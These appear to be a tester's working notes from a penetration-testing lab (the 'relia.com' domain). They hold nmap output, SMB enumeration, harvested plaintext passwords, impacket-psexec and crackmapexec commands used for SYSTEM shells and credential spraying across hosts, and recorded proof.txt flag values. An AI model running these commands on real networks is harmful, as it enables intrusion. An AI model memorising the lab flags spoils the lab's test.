|   Check 4 (port 63691/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: FILES, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:c2:4f (VMware)
| Names:
|   FILES<00>            Flags: <unique><active>
|   FILES<20>            Flags: <unique><active>
|   RELIA<00>            Flags: <group><active>
| Statistics:
|   00:50:56:ab:c2:4f:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00


			SMB:
CREDS:
sshpass -p "DRtajyCwcbWvH/9" ssh mountuser@172.16.122.21
impacket-psexec relia.com/mountuser:'DRtajyCwcbWvH/9'@172.16.122.21 cmd.exe

SPRAY AND PRAY: scripts READ,WRITE 
SMB         172.16.198.21   445    FILES            apps            READ            
SMB         172.16.198.21   445    FILES            IPC$            READ            Remote IPC
SMB         172.16.198.21   445    FILES            monitoring      READ            
SMB         172.16.122.21   445    FILES            scripts         READ,WRITE  

SMBMAP: DIDNT WORK 
smbmap -H 172.16.122.21
smbmap -u "mountuser" -p 'DRtajyCwcbWvH/9' -H 172.16.122.21 -s 'apps'
smbmap -u "mountuser" -p 'DRtajyCwcbWvH/9' -H 172.16.122.21 -s 'IPC$'
smbmap -u "mountuser" -p 'DRtajyCwcbWvH/9' -H 172.16.122.21 -s 'monitoring'
smbmap -u "mountuser" -p 'DRtajyCwcbWvH/9' -H 172.16.122.21 -s 'scripts'

SMBCLIENT: DIDNT WORK 
smbclient -L -U 'mountuser' \\\\172.16.122.21\\
smbclient -R -U 'mountuser' \\\\172.16.122.21\\scripts
smbclient -L //172.16.122.21 -U Administrator
smbclient -U mountuser \\\\172.16.122.21\\scripts
Password for [WORKGROUP\mountuser]:
session setup failed: NT_STATUS_LOGON_FAILURE

┌──(kali㉿kali)-[~] WORKED $$$
└─$ impacket-smbclient mountuser@172.16.122.21
Impacket v0.12.0.dev1 - Copyright 2023 Fortra
Password: DRtajyCwcbWvH/9
# help

# shares 
ADMIN$
apps
C$
IPC$
monitoring
scripts

# use scripts
# ls
drw-rw-rw-          0  Thu May  2 06:39:46 2024 .
drw-rw-rw-          0  Wed May  1 20:05:15 2024 ..
-rw-rw-rw-        437  Thu Oct 20 10:47:57 2022 ForceADReplication.ps1
-rw-rw-rw-       6320  Thu Oct 20 10:48:00 2022 Get-ADComputers-BitLockerInfo.ps1
-rw-rw-rw-        481  Thu Oct 20 10:48:03 2022 UserExpire - Copy - Copy.ps1
-rw-rw-rw-        280  Thu Oct 20 10:48:06 2022 UserExpire - Copy.ps1
-rw-rw-rw-        317  Thu Oct 20 10:48:11 2022 UserExpire.ps1
-rw-rw-rw-      34612  Thu Oct 20 10:48:14 2022 Windows10Scrub.ps1
-rw-rw-rw-       2822  Thu Oct 20 10:48:18 2022 workaround-36934-2021.ps1

# get ForceADReplication.ps1
# get Get-ADComputers-BitLockerInfo.ps1
# get UserExpire - Copy - Copy.ps1
# get UserExpire - Copy.ps1
# get UserExpire.ps1
# get Windows10Scrub.ps1
# get workaround-36934-2021.ps1

# use monitoring
# get PowerShell_transcript.FILES.KaQUnRKP.20221019133200.txt
# get PowerShell_transcript.FILES.EAy4aUdb.20221019132030.txt
# get PowerShell_transcript.FILES.aH73VcF9.20221019134841.txt
# get PowerShell_transcript.FILES.35fvmr5q.20221019013308.txt
# get PowerShell_transcript.FILES.9_DjDa0f.20221019132304.txt
PS C:\Users\Administrator> $spass = ConvertTo-SecureString "vau!XCKjNQBv2$" -AsPlaintext -Force
PS C:\Users\Administrator> $cred = New-Object System.Management.Automation.PSCredential("RELIA\Administrator", $spass)

Administrator:vau!XCKjNQBv2$

				SMB: Access
impacket-psexec relia/Administrator:'vau!XCKjNQBv2$'@172.16.122.21 cmd.exe
impacket-psexec relia.com/Administrator:'vau!XCKjNQBv2$'@172.16.122.21 cmd.exe

C:\Windows\system32> whoami
nt authority\system

PS C:\Users\Administrator\Desktop> hostname
FILES

C:\Windows\system32> powershell -ep bypass

PS C:\Users\Administrator\Desktop> cat proof.txt
fca515dabae9ec669f7f16071b40b5ec
5085bc57725c193159ea89057572d8b3

				SPRAY AND PRAY: 
crackmapexec smb 172.16.122.0/24 -u Administrator -p 'vau!XCKjNQBv2$' --shares

crackmapexec winrm 172.16.122.0/24 -u Administrator -p 'vau!XCKjNQBv2$' -d relia.com --continue-on-success



impacket-psexec relia.com/Administrator:'vau!XCKjNQBv2$'@172.16.122.6 cmd.exe

evil-winrm -i 172.16.122. -u Administrator -p 'vau!XCKjNQBv2$'

impacket-wmiexec relia/Administrator:'vau!XCKjNQBv2$'@172.16.122.

xfreerdp /u:Administrator /p:'vau!XCKjNQBv2$' /v:172.16.122.


				.6
┌──(kali㉿kali)-[~]
└─$ impacket-psexec relia.com/Administrator:'vau!XCKjNQBv2$'@172.16.122.6 cmd.exe

C:\Windows\system32> whoami
nt authority\system

PS C:\Users\Administrator\Desktop> hostname
DC02

PS C:\Users\Administrator\Desktop> cat proof.txt
cc9dff4e0a86e6ef134f449acdbf82fe


				.30
┌──(kali㉿kali)-[~]
└─$ impacket-psexec relia.com/Administrator:'vau!XCKjNQBv2$'@172.16.122.30 cmd.exe

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
WEBBY

PS C:\Users\Administrator\Desktop> cat proof.txt
381e564251a6cb40eed17c78a737af4d


				.189
┌──(kali㉿kali)-[~]
└─$ impacket-psexec relia.com/Administrator:'vau!XCKjNQBv2$'@192.168.162.189 cmd.exe

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
MAIL

C:\Windows\system32> cd C:\Users\Administrator\Desktop
 
C:\Users\Administrator\Desktop> type proof.txt
1fcc1ad1cb28c182637e9899601b6a7a


--------------------------------------------------------------------------------------------------
			.30 - proof only - WEBBY
RDP: 3389
HTTP: 80 47001
DB: Mongo DB 27017
SMB: 139 445
RPC: 135

┌──(kali㉿kali)-[~]
└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 172.16.128.30

RDP:
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| ssl-cert: Subject: commonName=WEBBY.relia.com
| Issuer: commonName=WEBBY.relia.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-03-30T22:35:58
| Not valid after:  2024-09-29T22:35:58
| MD5:   7932:e2cf:b0bb:d57e:0ba9:734a:4c61:c473
| SHA-1: e10c:da93:3ab6:aa01:ec28:d6d0:3f8d:3b5a:7384:3d6e
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: WEBBY
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: WEBBY.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-04-29T01:27:28+00:00
|_ssl-date: 2024-04-29T01:28:07+00:00; -1s from scanner time.

HTTP: 80 47001
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Anna Test Machine
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

DB: mongodb 27017
27017/tcp open  mongodb       syn-ack MongoDB
| mongodb-databases: 
|   ok = 0.0
|   codeName = UnsupportedOpQueryCommand
|   code = 352
|_  errmsg = Unsupported OP_QUERY command: listDatabases. The client driver may require an upgrade. For more details see https://dochub.mongodb.org/core/legacy-opcode-removal
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, OfficeScan, apple-iphoto, hazelcast-http, metasploit-msgrpc: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Type: text/plain
|     Content-Length: 85
|     looks like you are trying to access MongoDB over HTTP on the native driver port.
|   mongodb: 
|     errmsg
|     Unsupported OP_QUERY command: serverStatus. The client driver may require an upgrade. For more details see https://dochub.mongodb.org/core/legacy-opcode-removal
|     code
|     codeName
|_    UnsupportedOpQueryCommand
| mongodb-info: 
|   MongoDB Build info
|     targetMinOS = Windows 7/Windows Server 2008 R2
|     buildEnvironment
|       distmod = windows
|       linkflags = /nologo /DEBUG /INCREMENTAL:NO /LARGEADDRESSAWARE /OPT:REF
|       cxxflags = /TP
|       distarch = x86_64
|       ccflags = /nologo /WX /FImongo/platform/basic.h /fp:strict /EHsc /W3 /wd4068 /wd4244 /wd4267 /wd4290 /wd4351 /wd4355 /wd4373 /wd4800 /wd4251 /wd4291 /we4013 /we4099 /we4930 /errorReport:none /MD /O2 /Oy- /bigobj /utf-8 /permissive- /Zc:__cplusplus /Zc:sizedDealloc /volatile:iso /diagnostics:caret /std:c++17 /Gw /Gy /Zc:inline
|       cppdefines = SAFEINT_USE_INTRINSICS 0 PCRE_STATIC NDEBUG BOOST_ALL_NO_LIB _UNICODE UNICODE _SILENCE_CXX17_ALLOCATOR_VOID_DEPRECATION_WARNING _SILENCE_CXX17_OLD_ALLOCATOR_MEMBERS_DEPRECATION_WARNING _SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING _SILENCE_ALL_CXX20_DEPRECATION_WARNINGS _CONSOLE _CRT_SECURE_NO_WARNINGS _ENABLE_EXTENDED_ALIGNED_STORAGE _SCL_SECURE_NO_WARNINGS _WIN32_WINNT 0x0A00 BOOST_USE_WINAPI_VERSION 0x0A00 NTDDI_VERSION 0x0A000000 BOOST_THREAD_VERSION 5 BOOST_THREAD_USES_DATETIME BOOST_SYSTEM_NO_DEPRECATED BOOST_MATH_NO_LONG_DOUBLE_MATH_FUNCTIONS BOOST_ENABLE_ASSERT_DEBUG_HANDLER BOOST_LOG_NO_SHORTHAND_NAMES BOOST_LOG_USE_NATIVE_SYSLOG BOOST_LOG_WITHOUT_THREAD_ATTR ABSL_FORCE_ALIGNED_ACCESS
|       target_os = windows
|       cc = cl: Microsoft (R) C/C++ Optimizing Compiler Version 19.31.31107 for x64
|       cxx = cl: Microsoft (R) C/C++ Optimizing Compiler Version 19.31.31107 for x64
|       target_arch = x86_64
|     maxBsonObjectSize = 16777216
|     gitVersion = 94fb7dfc8b974f1f5343e7ea394d0d9deedba50e
|     versionArray
|       2 = 2
|       3 = 0
|       0 = 6
|       1 = 0
|     sysInfo = deprecated
|     ok = 1.0
|     version = 6.0.2
|     openssl
|       running = Windows SChannel
|     debug = false
|     bits = 64
|     storageEngines
|       2 = wiredTiger
|       0 = devnull
|       1 = ephemeralForTest
|     modules
|     allocator = tcmalloc
|     javascriptEngine = mozjs
|   Server status
|     ok = 0.0
|     codeName = UnsupportedOpQueryCommand
|     code = 352
|_    errmsg = Unsupported OP_QUERY command: serverStatus. The client driver may require an upgrade. For more details see https://dochub.mongodb.org/core/legacy-opcode-removal

SMB: 139 445
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
Host script results:
| nbstat: NetBIOS name: WEBBY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:21:75 (VMware)
| Names:
|   WEBBY<00>            Flags: <unique><active>
|   WEBBY<20>            Flags: <unique><active>
|   RELIA<00>            Flags: <group><active>
| Statistics:
|   00:50:56:ab:21:75:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-time: 
|   date: 2024-04-29T01:27:28
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 15421/tcp): CLEAN (Timeout)
|   Check 2 (port 16456/tcp): CLEAN (Timeout)
|   Check 3 (port 45520/udp): CLEAN (Timeout)
|   Check 4 (port 63895/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

RPC: 135
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC


--------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------

